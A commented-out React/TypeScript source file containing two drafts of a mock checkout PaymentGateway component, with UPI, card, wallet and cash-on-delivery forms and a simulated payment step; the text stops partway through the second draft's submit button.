// // import React, { useState, useEffect } from 'react';

// // // Define TypeScript interfaces
// // interface PaymentData {
// //   paymentId: string;
// //   method: string;
// //   amount: number;
// //   timestamp: string;
// // }

// // interface CardDetails {
// //   number: string;
// //   name: string;
// //   expiry: string;
// //   cvv: string;
// // }

// // interface SavedCard {
// //   id: number;
// //   number: string;
// //   name: string;
// //   expiry: string;
// // }

// // interface SavedUpi {
// //   id: number;
// //   upiId: string;
// // }

// // interface CartItemPayment {
// //   id: string;
// //   name: string;
// //   price: number;
// //   quantity: number;
// // }

// // interface PaymentGatewayProps {
// //   amount: number;
// //   deliveryFee?: number;
// //   cartItems?: CartItemPayment[];
// //   onPaymentComplete: (data: PaymentData) => void;
// //   onCancel: () => void;
// // }

// // const PaymentGateway: React.FC<PaymentGatewayProps> = ({ 
// //   amount, 
// //   deliveryFee = 0,
// //   cartItems = [], 
// //   onPaymentComplete,
// //   onCancel 
// // }) => {
// //   const [selectedMethod, setSelectedMethod] = useState<string>('upi');
// //   const [isProcessing, setIsProcessing] = useState<boolean>(false);
// //   const [paymentError, setPaymentError] = useState<string | null>(null);
// //   const [upiId, setUpiId] = useState<string>('');
// //   const [cardDetails, setCardDetails] = useState<CardDetails>({
// //     number: '',
// //     name: '',
// //     expiry: '',
// //     cvv: ''
// //   });
// //   const [savedCards, setSavedCards] = useState<SavedCard[]>([]);
// //   const [savedUpiIds, setSavedUpiIds] = useState<SavedUpi[]>([]);
// //   const [savePaymentMethod, setSavePaymentMethod] = useState<boolean>(false);

// //   // Simulating fetching saved payment methods on component mount
// //   useEffect(() => {
// //     // This would be an API call in a real application
// //     const fetchSavedPaymentMethods = () => {
// //       // Mock data
// //       setSavedCards([
// //         { id: 1, number: '****1234', name: 'John Doe', expiry: '12/25' },
// //         { id: 2, number: '****5678', name: 'John Doe', expiry: '09/26' }
// //       ]);
      
// //       setSavedUpiIds([
// //         { id: 1, upiId: 'johndoe@upi' },
// //         { id: 2, upiId: 'johndoe@bank' }
// //       ]);
// //     };
    
// //     fetchSavedPaymentMethods();
// //   }, []);

// //   const totalAmount = amount + deliveryFee;

// //   const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
// //     const { name, value } = e.target;
// //     setCardDetails(prev => ({ ...prev, [name]: value }));
// //   };

// //   const processPayment = async (e: React.FormEvent) => {
// //     e.preventDefault();
// //     setIsProcessing(true);
// //     setPaymentError(null);
    
// //     try {
// //       // In a real app, this would be an API call to a payment processor
// //       await new Promise(resolve => setTimeout(resolve, 2000)); // Simulate network request
      
// //       // Simulate successful payment
// //       if (Math.random() > 0.1) { // 90% success rate for demo
// //         onPaymentComplete({
// //           paymentId: `PAY_${Date.now()}`,
// //           method: selectedMethod,
// //           amount: totalAmount,
// //           timestamp: new Date().toISOString()
// //         });
// //       } else {
// //         // Simulate payment failure
// //         throw new Error('Payment processing failed. Please try again.');
// //       }
// //     } catch (error) {
// //       if (error instanceof Error) {
// //         setPaymentError(error.message);
// //       } else {
// //         setPaymentError('An unknown error occurred');
// //       }
// //     } finally {
// //       setIsProcessing(false);
// //     }
// //   };

// //   // Render card form
// //   const renderCardForm = () => (
// //     <div className="mb-4">
// //       <h3 className="text-lg font-medium mb-2">Pay with Card</h3>
      
// //       {savedCards.length > 0 && (
// //         <div className="mb-4">
// //           <p className="text-sm text-gray-600 mb-2">Saved Cards</p>
// //           {savedCards.map(card => (
// //             <div key={card.id} className="flex items-center border rounded-lg p-3 mb-2 cursor-pointer hover:bg-gray-50">
// //               <input 
// //                 type="radio" 
// //                 name="savedCard" 
// //                 id={`card-${card.id}`} 
// //                 className="mr-3"
// //               />
// //               <label htmlFor={`card-${card.id}`} className="flex-1 cursor-pointer">
// //                 <div className="flex items-center">
// //                   <div className="w-10 h-6 bg-blue-100 rounded flex items-center justify-center mr-3">
// //                     <span className="text-xs font-bold text-blue-800">VISA</span>
// //                   </div>
// //                   <div>
// //                     <p className="font-medium">{card.number}</p>
// //                     <p className="text-sm text-gray-600">Expires {card.expiry}</p>
// //                   </div>
// //                 </div>
// //               </label>
// //             </div>
// //           ))}
// //           <div className="my-4 border-t pt-4">
// //             <p className="text-sm font-medium mb-2">Or enter a new card</p>
// //           </div>
// //         </div>
// //       )}
      
// //       <div className="space-y-3">
// //         <div>
// //           <label className="block text-sm font-medium mb-1">Card Number</label>
// //           <input
// //             type="text"
// //             name="number"
// //             value={cardDetails.number}
// //             onChange={handleCardInputChange}
// //             placeholder="1234 5678 9012 3456"
// //             className="w-full p-2 border rounded-lg"
// //             maxLength={19}
// //           />
// //         </div>
        
// //         <div>
// //           <label className="block text-sm font-medium mb-1">Cardholder Name</label>
// //           <input
// //             type="text"
// //             name="name"
// //             value={cardDetails.name}
// //             onChange={handleCardInputChange}
// //             placeholder="John Doe"
// //             className="w-full p-2 border rounded-lg"
// //           />
// //         </div>
        
// //         <div className="grid grid-cols-2 gap-4">
// //           <div>
// //             <label className="block text-sm font-medium mb-1">Expiry Date</label>
// //             <input
// //               type="text"
// //               name="expiry"
// //               value={cardDetails.expiry}
// //               onChange={handleCardInputChange}
// //               placeholder="MM/YY"
// //               className="w-full p-2 border rounded-lg"
// //               maxLength={5}
// //             />
// //           </div>
// //           <div>
// //             <label className="block text-sm font-medium mb-1">CVV</label>
// //             <input
// //               type="text"
// //               name="cvv"
// //               value={cardDetails.cvv}
// //               onChange={handleCardInputChange}
// //               placeholder="123"
// //               className="w-full p-2 border rounded-lg"
// //               maxLength={3}
// //             />
// //           </div>
// //         </div>
        
// //         <div className="flex items-center mt-3">
// //           <input
// //             type="checkbox"
// //             id="saveCard"
// //             checked={savePaymentMethod}
// //             onChange={() => setSavePaymentMethod(!savePaymentMethod)}
// //             className="mr-2"
// //           />
// //           <label htmlFor="saveCard" className="text-sm">Save this card for future payments</label>
// //         </div>
// //       </div>
// //     </div>
// //   );

// //   // Render UPI form
// //   const renderUpiForm = () => (
// //     <div className="mb-4">
// //       <h3 className="text-lg font-medium mb-2">Pay with UPI</h3>
      
// //       {savedUpiIds.length > 0 && (
// //         <div className="mb-4">
// //           <p className="text-sm text-gray-600 mb-2">Saved UPI IDs</p>
// //           {savedUpiIds.map(upi => (
// //             <div key={upi.id} className="flex items-center border rounded-lg p-3 mb-2 cursor-pointer hover:bg-gray-50">
// //               <input 
// //                 type="radio" 
// //                 name="savedUpi" 
// //                 id={`upi-${upi.id}`} 
// //                 className="mr-3"
// //               />
// //               <label htmlFor={`upi-${upi.id}`} className="flex-1 cursor-pointer">
// //                 <div className="flex items-center">
// //                   <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3">
// //                     <span className="text-xs font-bold text-green-800">UPI</span>
// //                   </div>
// //                   <p className="font-medium">{upi.upiId}</p>
// //                 </div>
// //               </label>
// //             </div>
// //           ))}
// //           <div className="my-4 border-t pt-4">
// //             <p className="text-sm font-medium mb-2">Or enter a new UPI ID</p>
// //           </div>
// //         </div>
// //       )}
      
// //       <div>
// //         <label className="block text-sm font-medium mb-1">UPI ID</label>
// //         <input
// //           type="text"
// //           value={upiId}
// //           onChange={(e) => setUpiId(e.target.value)}
// //           placeholder="yourname@upi"
// //           className="w-full p-2 border rounded-lg"
// //         />
// //         <p className="text-xs text-gray-500 mt-1">Example: name@bank, name@upi, etc.</p>
// //       </div>
      
// //       <div className="flex items-center mt-3">
// //         <input
// //           type="checkbox"
// //           id="saveUpi"
// //           checked={savePaymentMethod}
// //           onChange={() => setSavePaymentMethod(!savePaymentMethod)}
// //           className="mr-2"
// //         />
// //         <label htmlFor="saveUpi" className="text-sm">Save this UPI ID for future payments</label>
// //       </div>
// //     </div>
// //   );

// //   // Render wallet form
// //   const renderWalletForm = () => (
// //     <div className="mb-4">
// //       <h3 className="text-lg font-medium mb-2">Pay with Wallet</h3>
      
// //       <div className="grid grid-cols-2 gap-3">
// //         {['PayTM', 'PhonePe', 'Mobikwik', 'FreeCharge'].map((wallet) => (
// //           <div key={wallet} className="border rounded-lg p-3 cursor-pointer hover:bg-gray-50 flex items-center">
// //             <input 
// //               type="radio" 
// //               name="wallet" 
// //               id={`wallet-${wallet}`} 
// //               className="mr-2"
// //             />
// //             <label htmlFor={`wallet-${wallet}`} className="cursor-pointer flex-1">
// //               <span className="font-medium">{wallet}</span>
// //             </label>
// //           </div>
// //         ))}
// //       </div>
      
// //       <p className="text-sm text-gray-500 mt-3">
// //         You will be redirected to the selected wallet to complete payment.
// //       </p>
// //     </div>
// //   );

// //   // Render cash on delivery option
// //   const renderCodOption = () => (
// //     <div className="mb-4">
// //       <h3 className="text-lg font-medium mb-2">Cash on Delivery</h3>
// //       <p className="text-sm text-gray-600">
// //         Pay with cash when your order is delivered.
// //       </p>
// //       <div className="bg-yellow-50 p-3 rounded-lg mt-3">
// //         <p className="text-sm text-yellow-800">
// //           Please keep exact change ready to ensure contactless delivery.
// //         </p>
// //       </div>
// //     </div>
// //   );

// //   return (
// //     <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden">
// //       {/* Header */}
// //       <div className="bg-gray-50 px-4 py-3 border-b">
// //         <h2 className="text-xl font-bold">Payment</h2>
// //       </div>
      
// //       {/* Order summary */}
// //       <div className="px-4 py-3 border-b">
// //         <div className="flex justify-between items-center mb-1">
// //           <span className="text-gray-600">Subtotal</span>
// //           <span>₹{amount.toFixed(2)}</span>
// //         </div>
// //         <div className="flex justify-between items-center mb-1">
// //           <span className="text-gray-600">Delivery Fee</span>
// //           <span>₹{deliveryFee.toFixed(2)}</span>
// //         </div>
// //         <div className="flex justify-between items-center font-bold">
// //           <span>Total</span>
// //           <span>₹{totalAmount.toFixed(2)}</span>
// //         </div>
// //       </div>
      
// //       {/* Payment methods tabs */}
// //       <div className="p-4">
// //         <div className="flex overflow-x-auto mb-4 pb-1">
// //           {[
// //             { id: 'upi', name: 'UPI' },
// //             { id: 'card', name: 'Card' },
// //             { id: 'wallet', name: 'Wallet' },
// //             { id: 'cod', name: 'Cash on Delivery' }
// //           ].map((method) => (
// //             <button
// //               key={method.id}
// //               onClick={() => setSelectedMethod(method.id)}
// //               className={`whitespace-nowrap px-4 py-2 mr-2 rounded-full text-sm font-medium ${
// //                 selectedMethod === method.id
// //                   ? 'bg-[#0c831f] text-white'
// //                   : 'bg-gray-100 text-gray-800 hover:bg-gray-200'
// //               }`}
// //             >
// //               {method.name}
// //             </button>
// //           ))}
// //         </div>
        
// //         <form onSubmit={processPayment}>
// //           {/* Render the selected payment method form */}
// //           {selectedMethod === 'card' && renderCardForm()}
// //           {selectedMethod === 'upi' && renderUpiForm()}
// //           {selectedMethod === 'wallet' && renderWalletForm()}
// //           {selectedMethod === 'cod' && renderCodOption()}
          
// //           {/* Error message */}
// //           {paymentError && (
// //             <div className="bg-red-50 text-red-700 p-3 rounded-lg mb-4">
// //               {paymentError}
// //             </div>
// //           )}
          
// //           {/* Payment buttons */}
// //           <div className="flex gap-3 mt-4">
// //             <button
// //               type="button"
// //               onClick={onCancel}
// //               className="px-4 py-2 border border-gray-300 rounded-lg text-gray-700 flex-1"
// //               disabled={isProcessing}
// //             >
// //               Cancel
// //             </button>
// //             <button
// //               type="submit"
// //               className="px-4 py-2 bg-[#0c831f] text-white rounded-lg flex-1 font-medium"
// //               disabled={isProcessing}
// //             >
// //               {isProcessing ? (
// //                 <span className="flex items-center justify-center">
// //                   <svg className="animate-spin h-5 w-5 mr-2" viewBox="0 0 24 24">
// //                     <circle
// //                       className="opacity-25"
// //                       cx="12"
// //                       cy="12"
// //                       r="10"
// //                       stroke="currentColor"
// //                       strokeWidth="4"
// //                     ></circle>
// //                     <path
// //                       className="opacity-75"
// //                       fill="currentColor"
// //                       d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
// //                     ></path>
// //                   </svg>
// //                   Processing...
// //                 </span>
// //               ) : (
// //                 `Pay ₹${totalAmount.toFixed(2)}`
// //               )}
// //             </button>
// //           </div>
// //         </form>
// //       </div>
// //     </div>
// //   );
// // };

// // export default PaymentGateway;



// import React, { useState, useEffect } from 'react';
// // If you want icons, install react-icons: npm install react-icons
// // import { FaCcVisa, FaRegCreditCard } from 'react-icons/fa'; 
// // import { SiUpi } from 'react-icons/si';

// // Define TypeScript interfaces (assuming these are correct and unchanged)
// interface PaymentData {
//   paymentId: string;
//   method: string;
//   amount: number;
//   timestamp: string;
// }

// interface CardDetails {
//   number: string;
//   name: string;
//   expiry: string;
//   cvv: string;
// }

// interface SavedCard {
//   id: number;
//   number: string; // e.g., '**** **** **** 1234'
//   brand: string; // e.g., 'VISA', 'MASTERCARD'
//   name: string;
//   expiry: string; // e.g., '12/25'
// }

// interface SavedUpi {
//   id: number;
//   upiId: string;
// }

// interface CartItemPayment {
//   id: string;
//   name: string;
//   price: number;
//   quantity: number;
// }

// interface PaymentGatewayProps {
//   amount: number;
//   deliveryFee?: number;
//   cartItems?: CartItemPayment[];
//   onPaymentComplete: (data: PaymentData) => void;
//   onCancel: () => void;
//   themeColor?: string; // Optional theme color prop
// }

// const PaymentGateway: React.FC<PaymentGatewayProps> = ({
//   amount,
//   deliveryFee = 0,
//   cartItems = [],
//   onPaymentComplete,
//   onCancel,
//   themeColor = '#0c831f', // Default theme color
// }) => {
//   const [selectedMethod, setSelectedMethod] = useState<string>('upi');
//   const [isProcessing, setIsProcessing] = useState<boolean>(false);
//   const [paymentError, setPaymentError] = useState<string | null>(null);
//   const [upiId, setUpiId] = useState<string>('');
//   const [cardDetails, setCardDetails] = useState<CardDetails>({
//     number: '',
//     name: '',
//     expiry: '',
//     cvv: '',
//   });
//   const [savedCards, setSavedCards] = useState<SavedCard[]>([]);
//   const [savedUpiIds, setSavedUpiIds] = useState<SavedUpi[]>([]);
//   const [savePaymentMethod, setSavePaymentMethod] = useState<boolean>(false);
//   const [selectedSavedCardId, setSelectedSavedCardId] = useState<number | null>(null);
//   const [selectedSavedUpiId, setSelectedSavedUpiId] = useState<number | null>(null);

//   // Simulating fetching saved payment methods
//   useEffect(() => {
//     const fetchSavedPaymentMethods = () => {
//       setSavedCards([
//         { id: 1, brand: 'VISA', number: '**** **** **** 1234', name: 'John Doe', expiry: '12/25' },
//         { id: 2, brand: 'MASTERCARD', number: '**** **** **** 5678', name: 'John Doe', expiry: '09/26' },
//       ]);
//       setSavedUpiIds([
//         { id: 1, upiId: 'johndoe@upi' },
//         { id: 2, upiId: 'johndoe@bank' },
//       ]);
//     };
//     fetchSavedPaymentMethods();
//   }, []);

//   const totalAmount = amount + deliveryFee;

//   const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
//     const { name, value } = e.target;
    
//     // Basic formatting for card number and expiry
//     let formattedValue = value;
//     if (name === 'number') {
//       formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
//     } else if (name === 'expiry') {
//        formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
//     } else if (name === 'cvv') {
//         formattedValue = value.replace(/\D/g, '');
//     }
    
//     setCardDetails(prev => ({ ...prev, [name]: formattedValue }));
//     // If user types in new card details, deselect any saved card
//     if (['number', 'name', 'expiry', 'cvv'].includes(name)) {
//         setSelectedSavedCardId(null);
//     }
//   };

//   const handleUpiInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
//       setUpiId(e.target.value);
//       // If user types in new UPI, deselect any saved UPI
//       setSelectedSavedUpiId(null);
//   }

//   const selectSavedCard = (card: SavedCard) => {
//       setSelectedSavedCardId(card.id);
//       // Clear new card details when a saved card is selected
//       setCardDetails({ number: '', name: '', expiry: '', cvv: '' }); 
//   }

//   const selectSavedUpi = (upi: SavedUpi) => {
//       setSelectedSavedUpiId(upi.id);
//       // Clear new UPI ID when a saved one is selected
//       setUpiId('');
//   }

//   const processPayment = async (e: React.FormEvent) => {
//     e.preventDefault();
//     setIsProcessing(true);
//     setPaymentError(null);

//     // Basic Validation (Example)
//     if (selectedMethod === 'card' && !selectedSavedCardId) {
//       if (!cardDetails.number || !cardDetails.name || !cardDetails.expiry || !cardDetails.cvv) {
//         setPaymentError('Please fill in all card details.');
//         setIsProcessing(false);
//         return;
//       }
//       // Add more specific validation (lengths, formats) here
//     }
//     if (selectedMethod === 'upi' && !selectedSavedUpiId) {
//       if (!upiId || !upiId.includes('@')) {
//          setPaymentError('Please enter a valid UPI ID.');
//          setIsProcessing(false);
//          return;
//       }
//     }

//     try {
//       await new Promise(resolve => setTimeout(resolve, 1500)); // Simulate network request

//       if (Math.random() > 0.1) { // 90% success rate
//         onPaymentComplete({
//           paymentId: `PAY_${Date.now()}`,
//           method: selectedMethod,
//           amount: totalAmount,
//           timestamp: new Date().toISOString(),
//         });
//       } else {
//         throw new Error('Payment processing failed. Please try again or use a different method.');
//       }
//     } catch (error) {
//       setPaymentError(error instanceof Error ? error.message : 'An unknown error occurred');
//     } finally {
//       setIsProcessing(false);
//     }
//   };

//   // --- Render Functions for Payment Methods ---

//   const renderCardForm = () => (
//     <div className="space-y-5">
//       <h3 className="text-lg font-semibold text-gray-800 mb-3">Pay with Card</h3>
      
//       {/* Saved Cards Section */}
//       {savedCards.length > 0 && (
//         <div className="space-y-3">
//           <p className="text-sm font-medium text-gray-600">Saved Cards</p>
//           {savedCards.map(card => (
//             <div 
//               key={card.id} 
//               onClick={() => selectSavedCard(card)}
//               className={`flex items-center border rounded-lg p-3 cursor-pointer transition duration-150 ease-in-out ${
//                 selectedSavedCardId === card.id 
//                   ? 'border-green-500 bg-green-50 ring-1 ring-green-500' 
//                   : 'border-gray-300 hover:bg-gray-50 hover:border-gray-400'
//               }`}
//             >
//               <input 
//                 type="radio" 
//                 name="savedCard" 
//                 id={`card-${card.id}`} 
//                 checked={selectedSavedCardId === card.id}
//                 onChange={() => selectSavedCard(card)}
//                 className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 mr-3"
//               />
//               <label htmlFor={`card-${card.id}`} className="flex-1 cursor-pointer">
//                 <div className="flex items-center justify-between">
//                     <div className="flex items-center">
//                         {/* Basic Card Brand Logo - replace with actual icons if desired */}
//                         <span className={`text-xs font-bold px-2 py-1 rounded mr-3 ${card.brand === 'VISA' ? 'bg-blue-100 text-blue-800' : 'bg-red-100 text-red-800'}`}>
//                             {card.brand} 
//                         </span>
//                         <div>
//                            <p className="font-medium text-sm text-gray-800">{card.number}</p>
//                            <p className="text-xs text-gray-500">Expires {card.expiry}</p>
//                         </div>
//                     </div>
//                     {/* Optional: Add a field for CVV next to the selected saved card */}
//                     {/* {selectedSavedCardId === card.id && ( ... CVV input ... )} */}
//                 </div>
//               </label>
//             </div>
//           ))}
//           <div className="text-center my-4">
//              <span className="text-xs text-gray-500 uppercase">Or enter a new card</span>
//              <hr className="mt-1"/>
//           </div>
//         </div>
//       )}
      
//       {/* New Card Form */}
//       <div className={`space-y-4 ${selectedSavedCardId ? 'opacity-50 pointer-events-none' : ''}`}>
//         <div>
//           <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
//           <input
//             type="text" id="cardNumber" name="number"
//             value={cardDetails.number} onChange={handleCardInputChange}
//             placeholder="0000 0000 0000 0000"
//             className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
//             maxLength={19} // 16 digits + 3 spaces
//             disabled={!!selectedSavedCardId}
//           />
//         </div>
        
//         <div>
//           <label htmlFor="cardName" className="block text-sm font-medium text-gray-700 mb-1">Cardholder Name</label>
//           <input
//             type="text" id="cardName" name="name"
//             value={cardDetails.name} onChange={handleCardInputChange}
//             placeholder="John Doe"
//             className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
//             disabled={!!selectedSavedCardId}
//           />
//         </div>
        
//         <div className="grid grid-cols-2 gap-4">
//           <div>
//             <label htmlFor="cardExpiry" className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
//             <input
//               type="text" id="cardExpiry" name="expiry"
//               value={cardDetails.expiry} onChange={handleCardInputChange}
//               placeholder="MM/YY"
//               className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
//               maxLength={5} // MM/YY
//               disabled={!!selectedSavedCardId}
//             />
//           </div>
//           <div>
//             <label htmlFor="cardCvv" className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
//             <input
//               type="password" // Use password type for CVV
//               id="cardCvv" name="cvv"
//               value={cardDetails.cvv} onChange={handleCardInputChange}
//               placeholder="123"
//               className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
//               maxLength={4} // Amex has 4 digits
//               disabled={!!selectedSavedCardId}
//             />
//           </div>
//         </div>
        
//         {/* Save Card Checkbox */}
//         {!selectedSavedCardId && (
//             <div className="flex items-center pt-2">
//               <input
//                 type="checkbox" id="saveCard"
//                 checked={savePaymentMethod}
//                 onChange={() => setSavePaymentMethod(!savePaymentMethod)}
//                 className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded"
//               />
//               <label htmlFor="saveCard" className="ml-2 block text-sm text-gray-700">Save this card securely for future payments</label>
//             </div>
//         )}
//       </div>
//     </div>
//   );

//   const renderUpiForm = () => (
//     <div className="space-y-5">
//         <h3 className="text-lg font-semibold text-gray-800 mb-3">Pay with UPI</h3>

//         {/* Saved UPI Section */}
//         {savedUpiIds.length > 0 && (
//         <div className="space-y-3">
//           <p className="text-sm font-medium text-gray-600">Saved UPI IDs</p>
//           {savedUpiIds.map(upi => (
//             <div 
//               key={upi.id} 
//               onClick={() => selectSavedUpi(upi)}
//               className={`flex items-center border rounded-lg p-3 cursor-pointer transition duration-150 ease-in-out ${
//                 selectedSavedUpiId === upi.id 
//                   ? 'border-green-500 bg-green-50 ring-1 ring-green-500' 
//                   : 'border-gray-300 hover:bg-gray-50 hover:border-gray-400'
//               }`}
//             >
//               <input 
//                 type="radio" 
//                 name="savedUpi" 
//                 id={`upi-${upi.id}`} 
//                 checked={selectedSavedUpiId === upi.id}
//                 onChange={() => selectSavedUpi(upi)}
//                 className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 mr-3"
//               />
//               <label htmlFor={`upi-${upi.id}`} className="flex-1 cursor-pointer">
//                 <div className="flex items-center">
//                   {/* Basic UPI Logo - replace with actual icon */}
//                   <span className="text-xs font-bold px-2 py-1 rounded mr-3 bg-purple-100 text-purple-800">
//                      UPI
//                   </span>
//                   <p className="font-medium text-sm text-gray-800">{upi.upiId}</p>
//                 </div>
//               </label>
//             </div>
//           ))}
//            <div className="text-center my-4">
//              <span className="text-xs text-gray-500 uppercase">Or enter a new UPI ID</span>
//              <hr className="mt-1"/>
//           </div>
//         </div>
//       )}

//         {/* New UPI ID Input */}
//         <div className={`space-y-1 ${selectedSavedUpiId ? 'opacity-50 pointer-events-none' : ''}`}>
//             <label htmlFor="upiId" className="block text-sm font-medium text-gray-700 mb-1">Enter UPI ID</label>
//             <input
//             type="text" id="upiId"
//             value={upiId}
//             onChange={handleUpiInputChange}
//             placeholder="yourname@bank or 9876543210@upi"
//             className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
//             disabled={!!selectedSavedUpiId}
//             />
//             <p className="text-xs text-gray-500 pt-1">Your UPI ID will be verified securely.</p>
//         </div>

//          {/* Save UPI Checkbox */}
//         {!selectedSavedUpiId && (
//             <div className="flex items-center pt-2">
//             <input
//                 type="checkbox" id="saveUpi"
//                 checked={savePaymentMethod}
//                 onChange={() => setSavePaymentMethod(!savePaymentMethod)}
//                 className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded"
//             />
//             <label htmlFor="saveUpi" className="ml-2 block text-sm text-gray-700">Save this UPI ID securely for future payments</label>
//             </div>
//         )}
//     </div>
//   );

//   const renderWalletForm = () => (
//     <div className="space-y-4">
//       <h3 className="text-lg font-semibold text-gray-800 mb-3">Pay with Wallet</h3>
      
//       <div className="grid grid-cols-2 gap-3">
//         {['PayTM', 'PhonePe', 'Mobikwik', 'Amazon Pay'].map((wallet) => (
//           <div key={wallet} className="border border-gray-300 rounded-lg p-3 cursor-pointer hover:bg-gray-50 hover:border-gray-400 flex items-center transition duration-150 ease-in-out">
//             <input 
//               type="radio" 
//               name="wallet" 
//               id={`wallet-${wallet}`} 
//               className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 mr-2"
//               // Add state/handler if needed to track selected wallet
//             />
//             <label htmlFor={`wallet-${wallet}`} className="cursor-pointer flex-1 text-sm font-medium text-gray-700">
//               {/* Add Wallet Logos Here */}
//               {wallet}
//             </label>
//           </div>
//         ))}
//       </div>
      
//       <p className="text-sm text-gray-600 pt-2">
//         You might be redirected to the selected wallet's app or website to complete the payment securely.
//       </p>
//     </div>
//   );

//   const renderCodOption = () => (
//      <div className="space-y-3">
//       <h3 className="text-lg font-semibold text-gray-800 mb-2">Cash on Delivery</h3>
//       <p className="text-sm text-gray-600">
//         Pay in cash at the time of delivery.
//       </p>
//       <div className="bg-orange-50 border border-orange-200 p-3 rounded-lg mt-3">
//         <p className="text-sm text-orange-800">
//           Please keep the exact change ready to minimize contact and ensure a smooth delivery. Availability might depend on your location and order value.
//         </p>
//       </div>
//     </div>
//   );

//   // --- Main Component Return ---
// // --- Keep all the interface definitions, state, functions (like renderCardForm, etc.) the same ---

// // --- Modify only the main return statement ---
// return (
//     // Added: flex, flex-col, max-h-[90vh] (adjust as needed), removed overflow-hidden
//     <div className="w-[32rem] mx-auto bg-white rounded-xl shadow-lg border border-gray-200 flex flex-col max-h-[90vh]">
      
//       {/* Header - Added flex-shrink-0 */}
//       <div className="bg-gray-50 px-6 py-4 border-b border-gray-200 flex-shrink-0">
//         <h2 className="text-xl font-semibold text-gray-800">Complete Your Payment</h2>
//       </div>
      
//       {/* Order Summary - Added flex-shrink-0 */}
//       <div className="px-6 py-4 border-b border-gray-200 bg-gray-50/50 flex-shrink-0">
//          <h3 className="text-md font-medium text-gray-700 mb-3">Order Summary</h3>
//          <div className="space-y-2">
//             {/* ... (subtotal, delivery fee, total lines remain the same) ... */}
//              <div className="flex justify-between items-center text-sm">
//                  <span className="text-gray-600">Subtotal</span>
//                  <span className="text-gray-800">₹{amount.toFixed(2)}</span>
//              </div>
//              <div className="flex justify-between items-center text-sm">
//                  <span className="text-gray-600">Delivery Fee</span>
//                  <span className="text-gray-800">₹{deliveryFee.toFixed(2)}</span>
//              </div>
//              <hr className="my-2"/>
//              <div className="flex justify-between items-center font-semibold text-md">
//                  <span className="text-gray-900">Total Amount</span>
//                  <span className="text-gray-900">₹{totalAmount.toFixed(2)}</span>
//              </div>
//         </div>
//       </div>
      
//       {/* Scrollable Content Area - Added: p-6, flex-grow, overflow-y-auto */}
//       {/* The form is now inside this scrollable area */}
//       <form onSubmit={processPayment} className="flex-grow overflow-y-auto p-6"> 
//         {/* Payment methods tabs */}
//         <div className="mb-6">
//            <p className="text-sm font-medium text-gray-700 mb-3">Select Payment Method</p>
//            <div className="flex space-x-2 border-b border-gray-200 pb-2">
//               {[
//                 { id: 'upi', name: 'UPI' },
//                 { id: 'card', name: 'Card' },
//                 { id: 'wallet', name: 'Wallet' },
//                 { id: 'cod', name: 'Cash on Delivery' }
//               ].map((method) => (
//                 <button
//                   key={method.id}
//                   type="button" // Keep as button to prevent form submission
//                   onClick={() => {
//                       setSelectedMethod(method.id);
//                       setPaymentError(null); 
//                   }}
//                   className={`whitespace-nowrap px-4 py-2 rounded-md text-sm font-medium transition duration-150 ease-in-out focus:outline-none focus:ring-2 focus:ring-offset-1 focus:ring-green-500 ${
//                     selectedMethod === method.id
//                       ? 'bg-green-600 text-white shadow-sm'
//                       : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
//                   }`}
//                   style={selectedMethod === method.id ? { backgroundColor: themeColor } : {}}
//                 >
//                   {method.name}
//                 </button>
//               ))}
//            </div>
//         </div>
        
//         {/* Render the selected payment method form */}
//         {/* Adjusted min-height slightly, maybe not needed anymore with flex-grow */}
//         <div className="min-h-[200px]"> 
//             {selectedMethod === 'card' && renderCardForm()}
//             {selectedMethod === 'upi' && renderUpiForm()}
//             {selectedMethod === 'wallet' && renderWalletForm()}
//             {selectedMethod === 'cod' && renderCodOption()}
//         </div>

//         {/* NOTE: Buttons and Error are moved OUTSIDE this scrollable form tag and into the footer below */}
        
//       </form> {/* End of scrollable form section */}

//       {/* Footer / Action Buttons - Added: p-6, flex-shrink-0. Contains error and buttons */}
//       <div className="p-6 border-t border-gray-200 bg-white flex-shrink-0">
//           {/* Error message - Moved here */}
//           {paymentError && (
//             <div className="bg-red-100 border border-red-300 text-red-800 px-4 py-3 rounded-lg mb-4 text-sm">
//               {paymentError}
//             </div>
//           )}
          
//           {/* Payment buttons */}
//           <div className="flex flex-col sm:flex-row gap-3">
//             <button
//               type="button" // Stays type="button"
//               onClick={onCancel}
//               className="px-5 py-3 border border-gray-300 rounded-lg text-gray-700 text-sm font-medium w-full sm:w-auto hover:bg-gray-100 transition duration-150 ease-in-out disabled:opacity-50"
//               disabled={isProcessing}
//             >
//               Cancel Payment
//             </button>
//             <button
//               type="submit" // Stays type="submit", but now needs to target the form via ID or context if outside
//               form="payment-form" // Assign an ID to the form tag and reference it here
